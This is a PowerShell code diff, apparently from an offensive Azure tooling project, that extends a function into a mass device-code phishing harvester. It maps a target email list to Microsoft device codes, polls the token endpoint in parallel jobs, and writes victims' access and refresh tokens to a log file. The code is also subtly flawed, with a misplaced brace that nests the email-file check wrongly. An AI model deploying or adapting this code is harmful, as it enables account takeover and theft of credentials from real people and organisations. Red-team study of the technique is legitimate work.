@@ -262,7 +262,9 @@ function Get-AzureTokenMulti {
     .DESCRIPTION
         Generate a device code to be used at https://www.microsoft.com/devicelogin. Once a user has successfully authenticated, you will be presented with a JSON Web Token JWT in the variable $response.
     .EXAMPLE
-        Get-AzureToken -Client Substrate
+        Get-AzureToken -Client MSGraph -Count 50
+    .EXAMPLE
+        Get-AzureToken -Client MSGraph -InputFile .\emails.csv
     #>
     [cmdletbinding()]
     Param(
@@ -284,10 +286,13 @@ function Get-AzureTokenMulti {
         [String]$Browser,
         [Parameter(Mandatory=$False)]
         [String]
-        $CaptureCode,
+        $LogFile = "TokenLog.log",
         [Parameter(Mandatory=$False)]
         [String]
-        $LogFile = "TokenLog.log",
+        $CodeFile = "DeviceCodes.csv",
+        [Parameter(Mandatory=$False)]
+        [String]
+        $InputFile,
         [Parameter(Mandatory=$False)]
         [Int]
         $Count = "10"
@@ -374,75 +379,123 @@ function Get-AzureTokenMulti {
         }
     }     
     # Login Process
-    $global:responses = if($responses.Count -eq 0){@()}else{$responses}
+    if($responses.Count -eq 0){$global:responses = @()}
     $DeviceCodes = @{}
     $ValidCodes = @()
+    if(Test-Path $CodeFile){
+        Write-Host "Detected existing Device Code file at '$CodeFile'. Removing it first."
+        Remove-Item $CodeFile
+    if($InputFile -and (Test-Path $InputFile)){
+        $emails = Get-Content $InputFile
+        $Count = $emails.Count
+        }
+    }
     for ($i =  1; $i -le $Count; $i++){
         $authResponse = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" -Headers $Headers -Body $body -ErrorAction SilentlyContinue
-        write-output $authResponse
+        Write-Verbose $authResponse
         $interval = $authResponse.interval
         $expires =  $authResponse.expires_in
         $DeviceCodes += @{$authResponse.user_code = $authResponse.device_code}
+        if($emails){
+            Add-Content $CodeFile "$($emails[$i-1]),$($authResponse.user_code)"
+        }
+        Write-Progress -Activity "Generating Device Codes" -Status "$($authResponse.user_code)" -PercentComplete (($i/$Count)*100)
     }
-    write-output $DeviceCodes.Keys
+    Write-Progress -Activity "Generating Device Codes" -Status "Done" -Completed
+    Write-Output "Device Codes: `n$($DeviceCodes.Keys)"
+    if(-not $emails){
+        $DeviceCodes.Keys | Out-File $CodeFile
+    }
+    Write-Output "$Count device codes saved to '$CodeFile'. They are valid for $($expires/60) minutes!"
         
-    while($true)
-    {
-        Start-Sleep -Seconds $interval
-        $total += $interval
+    foreach ($code in $DeviceCodes.GetEnumerator()){
+        $job = Start-Job -ArgumentList @($code,$ClientID,$interval,$expires) -Name "DeviceCode-$($code.Key)" -Scriptblock {
+            Param(
+            $code,
+            [String]$ClientID,
+            [Int]$interval,
+            [Int]$expires
+            )
+            $continue = $True
+            While($continue){
+                Start-Sleep -Seconds $interval
+                $total += $interval
+                if($total -gt $expires)
+                {
+                    return
+                }
+                # Try to get the response. Will give 40x while pending so we need to try&catch
+                try
+                {
+                    $body=@{
+                        "client_id" =  $ClientID
+                        "grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
+                        "code" =       $code.Value
+                    }
+                    $response = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0" -Headers $Headers -Body $body -ErrorAction SilentlyContinue
+                }
+                catch
+                {
+                    # This is normal flow, always returns 40x unless successful
+                    $details=$_.ErrorDetails.Message | ConvertFrom-Json
 
-        if($total -gt $expires)
-        {
-            Write-Error "Timeout occurred"
+                    if($details.error -ne "authorization_pending")
+                    {
+                        # This is a real error
+                        Write-Error $details.error
+                        Write-Error $details.error_description
+                        return
+                    }
+                }
+
+                # If we got response, all okay!
+                if($response)
+                {
+                    return @{
+                        "response"= $response
+                        "code"= $code
+                    }
+                }
+            }
             return
         }
-        foreach ($code in $DeviceCodes.GetEnumerator()){
-            # Try to get the response. Will give 40x while pending so we need to try&catch
-            try
-            {
-                $body=@{
-                    "client_id" =  $ClientID
-                    "grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
-                    "code" =       $code.Value
-                }
-                $response = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0" -Headers $Headers -Body $body -ErrorAction SilentlyContinue
-            }
-            catch
-            {
-                # This is normal flow, always returns 40x unless successful
-                $details=$_.ErrorDetails.Message | ConvertFrom-Json
-
-                if($details.error -ne "authorization_pending")
-                {
-                    # This is a real error
-                    Write-Output $details.error
-                    Write-Error $details.error_description
-                    continue
-                }
-            }
-
-            # If we got response, all okay!
-            if($response)
-            {
+        Write-Progress -Activity "Starting threads" -Status "DeviceCode-$($code.Key)" -PercentComplete (((($DeviceCodes.GetEnumerator().Name.IndexOf($code.Key))+1)/$DeviceCodes.Count)*100)
+    }
+    Write-Progress -Activity "Starting threads" -Status "Started all $($DeviceCodes.Count) threads" -Completed
+    try{
+        While((Get-Job).Count -ne 0){
+            # Wait until all jobs have completed
+            # https://adamtheautomator.com/powershell-multithreading/
+            # Remove completed jobs without data
+            Start-Sleep 5
+            Write-Output "Status: $($ValidCodes.Count)/$Count"
+            Get-Job -State Completed -HasMoreData $False -Name "DeviceCode-*" | %{Remove-Job $_}
+            # Check completed jobs with data (Successful authentication!)
+            Get-Job -State Completed -HasMoreData $True -Name "DeviceCode-*" | %{
+                $output = Receive-Job $_
+                if ($output -eq $null){return} # Timeout occurred
+                $response = $output["response"]
+                $code = $output["code"].Key
                 $global:responses += $response
-                $DeviceCodes.Remove($code.Key)
-                $ValidCodes += $code.Key
-                $jwt = $response.access_token
-                $target = (Parse-JWTtoken -token $jwt).unique_name
-                write-output "Got a response for code '$($code.Key)' by '$target'!"
+                $ValidCodes += $code
+                $target = (Parse-JWTtoken -token $response.access_token).unique_name
+                write-output "Got a response for code '$($code)' by '$target'!"
                 write-output "Access with `$responses[$($responses.Count -1)]"
                 write-output $response
-                "-------------------- Token - $($code.Key) - $target --------------------" |Out-File -Append $LogFile
+                "-------------------- Token - $($code) - $target --------------------" |Out-File -Append $LogFile
                 "Scope: $($response.scope)" | Out-File -Append $LogFile
                 "Resource: $($response.resource)" | Out-File -Append $LogFile
                 "Access Token: $($response.access_token)" | Out-File -Append $LogFile
                 "Refresh Token: $($response.refresh_token)" | Out-File -Append $LogFile
-                $response = $null
-                break
             }
         }
-        Write-Output "Status: $($ValidCodes.Count)/$Count"
+        Write-Host "All codes expired." 
+    }finally{
+        # Forcefully kill all jobs when the script ends
+        Write-Host "Killing all threads before stopping."
+        Get-Job -Name "DeviceCode-*" | %{Remove-Job $_ -Force}
     }
+
 }
 # Refresh Token Functions
 function RefreshTo-SubstrateToken {
